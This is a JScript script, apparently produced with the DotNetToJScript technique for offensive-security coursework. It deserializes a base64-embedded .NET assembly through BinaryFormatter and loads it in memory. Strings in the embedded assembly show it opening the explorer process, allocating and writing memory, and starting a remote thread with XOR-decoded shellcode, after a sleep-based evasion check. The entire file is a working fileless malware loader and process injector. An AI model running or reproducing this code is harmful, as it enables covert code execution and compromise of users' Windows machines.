function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABoAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAd8kqYwAAAAAA"+
"AAAA8AAiIAsCMAAAEgAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAYA"+
"AAAAAAAAAGAAAAACAAAAAAAAAwBghQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkLAAA"+
"HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAhBAAAAAgAAAAEgAAAAIAAAAAAAAAAAAAAAAAACAA"+
"AGAucnNyYwAAAAwEAAAAQAAAAAYAAAAUAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUAWCEAAAwLAAABAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBwD4AAAAAQAAEQIoEAAA"+
"CgAAKBEAAAoKIBAnAAAoAQAABgAoEQAAChMJEgkGKBIAAAoTChIKKBMAAAoLByMAAAAAAAAjQP4E"+
"EwsRCywGADitAAAAcgEAAHAoFAAACgwIFppvFQAACg0g/w8fABYJKAIAAAYTBBEEfhYAAAogABAA"+
"ACAAMAAAH0AoAwAABhMFIOcCAACNFwAAASXQAwAABCgXAAAKEwYWEwwrGQARBhEMEQYRDJEg+gAA"+
"AGHSnAARDBdYEwwRDBEGjmn+BBMNEQ0t2REEEQURBhEGjmkSBygEAAAGJhEEfhYAAAoWEQV+FgAA"+
"ChZ+FgAACigFAAAGEwgqJgADKBgAAAomKgAAQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAA"+
"BQBsAAAArAMAACN+AAAYBAAABAUAACNTdHJpbmdzAAAAABwJAAAUAAAAI1VTADAJAAAQAAAAI0dV"+
"SUQAAABACQAAzAEAACNCbG9iAAAAAAAAAAIAAAFXnQI0CQIAAAD6ATMAFgAAAQAAABoAAAAEAAAA"+
"AwAAAAcAAAAWAAAAGAAAAAIAAAAQAAAAAQAAAAEAAAABAAAABQAAAAEAAAABAAAAAgAAAAEAAAAA"+
"AAwDAQAAAAAABgA3AtgDBgCkAtgDBgBrAYYDDwD4AwAABgCTAUcDBgAaAkcDBgD7AUcDBgCLAkcD"+
"BgBXAkcDBgBwAkcDBgCqAUcDBgB/AbkDBgBdAbkDBgDeAUcDBgDFAeACBgChBCADBgAeASADCgBp"+
"BIYDBgAnAyADBgBCAdgDBgAnASADBgB/AyADBgDCAiADBgAqBNgDBgDZBCADBgDpACADAAAAAGAA"+
"AAAAAAEAAQABABAAOQQAAEEAAQABAAABAABpAAAAQQADAAgAEwEAAEIAAABVAAQACABWgIgAcABW"+
"gJkAcwAzAQEAdgAAAAAAgACRIF4DegABAAAAAACAAJEgWgR/AAIAAAAAAIAAkSDABIYABQAAAAAA"+
"gACRIO8EjwAKAAAAAACAAJEg1gCaAA8ASCAAAAAAhhh5AwYAFgBMIQAAAACGAGYEEAAWAAAAAQCq"+
"AwAAAQBDBAAAAgD8AAAAAwDMAAAAAQBRBAAAAgB/BAAAAwDZAgAABAAxAQAABQCoBAAAAQBRBAAA"+
"AgBxBAAAAwBkAwAABADTAgIABQAwAwAAAQBRBAAAAgAHBAAAAwDHAgAABACJBAAABQBtAwAABgAa"+
"BAAABwDBAAAAAQD6AgkAeQMBABEAeQMGABkAeQMKACkAeQMQADEAeQMQADkAeQMQAEEAeQMQAEkA"+
"eQMQAFEAeQMQAFkAeQMQAGEAeQMVAGkAeQMQAHEAeQMQAHkAeQMQAKEAeQMGAIEAeQMGAIkAuAQx"+
"AIkAmAQ2AJkAmQM9AJEACwFBAJEAugBIALEAWQNMAMEAzwRPAJEAsgRXAAkABABmAAgACABrAC4A"+
"CwClAC4AEwCuAC4AGwDNAC4AIwDWAC4AKwDrAC4AMwAVAS4AOwAVAS4AQwDWAC4ASwAbAS4AUwAV"+
"AS4AWwAVAS4AYwBAAS4AawBqAS4AcwB3AUMAWwDBAWMAewDHAQEA5wIAAAQAGgD/AgABAwBeAwEA"+
"QQEFAFoEAQBBAQcAwAQBAAABCQDvBAEAAAELANYAAQCcLQAAAwAEgAAAAQAAAAAAAAAAAAAAAADf"+
"BAAABAAAAAAAAAAAAAAAXQCxAAAAAAAEAAAAAAAAAAAAAABdACADAAAAAAQAAwAAAAA4MUIzQTAx"+
"NjM1RjNBMTcyNTVDRDI3RkM5QjYzMTZDQzAxOUExRjk4NkRFRDA5RDE4RURFQTE4MzAxQkE3Q0Ex"+
"AF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9NzQzADxNb2R1bGU+ADxQcml2YXRlSW1wbGVtZW50"+
"YXRpb25EZXRhaWxzPgBDUkVBVEVfU1VTUEVOREVEAFBST0NFU1NCQVNJQ0lORk9STUFUSU9OAG1z"+
"Y29ybGliAGdldF9JZABscFRocmVhZElkAHByb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAUnVu"+
"dGltZUZpZWxkSGFuZGxlAGJJbmhlcml0SGFuZGxlAEdldFByb2Nlc3Nlc0J5TmFtZQBEYXRlVGlt"+
"ZQBWYWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBH"+
"dWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3Nl"+
"bWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1l"+
"d29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmln"+
"dXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9u"+
"UmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29w"+
"eXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJp"+
"bGl0eUF0dHJpYnV0ZQBCeXRlAGR3U3RhY2tTaXplAG5TaXplAGR3U2l6ZQBTeXN0ZW0uUnVudGlt"+
"ZS5WZXJzaW9uaW5nAHBhdGgAa2VybmVsMzIuZGxsAEV4YW1wbGVBc3NlbWJseS5kbGwAU3lzdGVt"+
"AFRpbWVTcGFuAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AU3lzdGVtLlJlZmxlY3Rpb24AWmVybwBT"+
"bGVlcABscEJ1ZmZlcgBscFBhcmFtZXRlcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNz"+
"AGdldF9Ub3RhbFNlY29uZHMAZHdNaWxsaXNlY29uZHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNl"+
"cnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAbHBU"+
"aHJlYWRBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBSdW50aW1lSGVscGVycwBUZXN0Q2xhc3MA"+
"cHJvY2Vzc0FjY2VzcwBoUHJvY2VzcwBPcGVuUHJvY2VzcwBSdW5Qcm9jZXNzAGxwQmFzZUFkZHJl"+
"c3MAbHBBZGRyZXNzAGxwU3RhcnRBZGRyZXNzAFN1YnRyYWN0AE9iamVjdABmbFByb3RlY3QAU3Rh"+
"cnQAZ2V0X05vdwBWaXJ0dWFsQWxsb2NFeABJbml0aWFsaXplQXJyYXkARXhhbXBsZUFzc2VtYmx5"+
"AFdyaXRlUHJvY2Vzc01lbW9yeQAAAAARZQB4AHAAbABvAHIAZQByAAAAOoUT56zLcUy/kT1EKjIw"+
"PAAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECFgcOEUUNHRJJCBgYHQUYGBFFEU0CCAIEAAARRQYg"+
"ARFNEUUDIAANBgABHRJJDgMgAAgCBhgHAAIBEmURaQUAARJJDgi3elxWGTTgiQQEAAAABAAAAAAC"+
"BgkCBggDBhEQBAABAQkGAAMYCQIICAAFGBgYCQkJCgAFAhgYHQUIEBgKAAcYGBgJGBgJGAgBAAgA"+
"AAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQAHAQAAAAAUAQAPRXhhbXBsZUFz"+
"c2VtYmx5AAApAQAkRXhhbXBsZSBBc3NlbWJseSBmb3IgRG90TmV0VG9KU2NyaXB0AAAFAQAAAAAk"+
"AQAfQ29weXJpZ2h0IMKpIEphbWVzIEZvcnNoYXcgMjAxNwAAKQEAJDU2NTk4ZjFjLTZkODgtNDk5"+
"NC1hMzkyLWFmMzM3YWJlNTc3NwAADAEABzEuMC4wLjAAAEkBABouTkVURnJhbWV3b3JrLFZlcnNp"+
"b249djQuOAEAVA4URnJhbWV3b3JrRGlzcGxheU5hbWUSLk5FVCBGcmFtZXdvcmsgNC44BQEAAQAA"+
"BAEAAAAAAAAAd8kqYwAAAAACAAAAHAEAAIAsAACADgAAUlNEU2pkAPxyc3FHgQtilU2xxNoBAAAA"+
"XFwxOTIuMTY4LjMuNVxTaGFyZWRcT1NFUC1Db2RlLVNuaXBwZXRzXERvdE5ldFRvSlNjcmlwdFxF"+
"eGFtcGxlQXNzZW1ibHlcb2JqXHg2NFxEZWJ1Z1xFeGFtcGxlQXNzZW1ibHkucGRiAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGsnkeChI2+vr6u6u7qqiyyyifsnGomqus"+
"snGo4rJxqNqycYiqt8szsvVNsLCyyzpWxpuG+Nbauzsz97v7OxgXqLJxqNq7q3G4xrL7Kpx7guLx"+
"+PV/iPr6+nF6cvr6+rJ/Oo6dsvsqvnG62rP7KnGy4qoZrLfLM7IFM7txznKy+yyyyzpWuzsz97v7"+
"O8Iajwu2+bbe8r/DK48ior5xut6z+yqcu3H2sr5xuuaz+yq7cf5yu6K7orL7KqSjoLuiu6O7oLJ5"+
"Ftq7qAUaorujoLJx6BOxBQUFp7LLIamzRI2TlJOUn476u6yycxuzPTi2jdz9BS+pqbJzG6mgt8s6"+
"t8szqamzQMCsg136+vr6BS8S9fr6+svDyNTLzMLUzsPUyMnD+qCyczuzPTpB+/r6t8szqamQ+amz"+
"QK1zZTz6+vr6BS8SRvr6+tWrucq7vqipvpaVksOosoK9spfMyrOrtpSNmZCdoLOQmbCvzpC5pbG+"+
"kbaei6C9kbabiai1ta29iJPJqYDLtJKUt5y1qaKAo4isjcmvo52JjsyvmYzCvpzNrqKWkpuSq7u1"+
"w9e1g8ujyILMiJO2ooCOqK6Im8usicKlq8K3zoCluLGws4iVna6csK6Rn4OQv6qbjL3Iqr6gl8Oy"+
"nbeom8mqmLeog6y5mJCQwrPIla+QmZKCoJi4rZSXtaz6snM7qaC7orfLM6myQvrIUn76+vr6qqmp"+
"sz04Ea/UwQUvsnM8kPClsnMLkOWgqJJ6yfr6s3MakP67o7NAj7xkfPr6+voFL7fLOqmgsnMLt8sz"+
"t8szqamzPTjX/OKBBS9/Oo/lsj07cun6+rNAvgrPGvr6+voFL7IFNY74EVASr/r6+qmjkLqgs3Mr"+
"Oxjqsz06+ur6+rNAol6pH/r6+voFL7Jpqamycx2ycwuycyCzPTr62vr6s3MDs0DobHMY+vr6+gUv"+
"snk+2n86jkiccf2y+zl/Oo8oojmikPqjQRrn0PC7cyAFLwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQAB"+
"AAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAACwAwAAAAAAAAAAAACwAzQAAABWAFMA"+
"XwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAA"+
"AAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAA"+
"JAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEEAMAAAEAUwB0AHIAaQBuAGcARgBp"+
"AGwAZQBJAG4AZgBvAAAA7AIAAAEAMAAwADAAMAAwADQAYgAwAAAAYgAlAAEAQwBvAG0AbQBlAG4A"+
"dABzAAAARQB4AGEAbQBwAGwAZQAgAEEAcwBzAGUAbQBiAGwAeQAgAGYAbwByACAARABvAHQATgBl"+
"AHQAVABvAEoAUwBjAHIAaQBwAHQAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAA"+
"AAAAAEgAEAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABFAHgAYQBtAHAAbABl"+
"AEEAcwBzAGUAbQBiAGwAeQAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAA"+
"LgAwAC4AMAAAAEgAFAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAARQB4AGEAbQBwAGwAZQBB"+
"AHMAcwBlAG0AYgBsAHkALgBkAGwAbAAAAGIAHwABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgA"+
"dAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgAEoAYQBtAGUAcwAgAEYAbwByAHMAaABhAHcAIAAy"+
"ADAAMQA3AAAAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAFAA"+
"FAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABFAHgAYQBtAHAAbABlAEEAcwBz"+
"AGUAbQBiAGwAeQAuAGQAbABsAAAAQAAQAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABFAHgA"+
"YQBtAHAAbABlAEEAcwBzAGUAbQBiAGwAeQAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBp"+
"AG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkA"+
"bwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0"+
"aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}